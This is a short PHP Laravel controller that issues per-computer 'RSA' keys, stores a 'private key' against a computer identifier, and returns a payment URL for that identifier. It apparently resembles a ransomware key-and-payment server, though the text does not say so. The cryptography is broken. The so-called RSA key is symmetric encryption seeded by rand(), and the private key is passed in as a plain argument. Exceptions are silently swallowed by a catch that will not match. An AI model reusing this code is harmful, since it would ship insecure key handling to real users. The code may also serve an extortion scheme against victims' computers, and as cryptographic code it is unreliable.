<?php

namespace App\Http\Controllers;

use App\Rsa;
use http\Env\Request;
use Illuminate\Support\Facades\Crypt;

class ApiController extends Controller
{
    public function getRsaKey($identifier, Rsa $rsa)
    {
        // generate their id and a random string first
        $random = rand();

        $preGenerated = $random.$identifier;
       
    	// generate an RSA key based on their identifier
    	$key = Crypt::encrypt($preGenerated);

    	$rsa->generate($random, $identifier, $key);

    	return response()->json([
            'rsa' => $key,
            'url' => urldecode(action('PayController@getPayment', $identifier))
        ]);
    }

    public function saveRsaKey($identifier, $privateKey){
        try{
            $rsa = new Rsa();
            $rsa->key_identifier = $privateKey;
            $rsa->computer_identifier = $identifier;
            $rsa->save();
        }
        catch(Exception $e){
            // do nothing for now
        }
    }
}
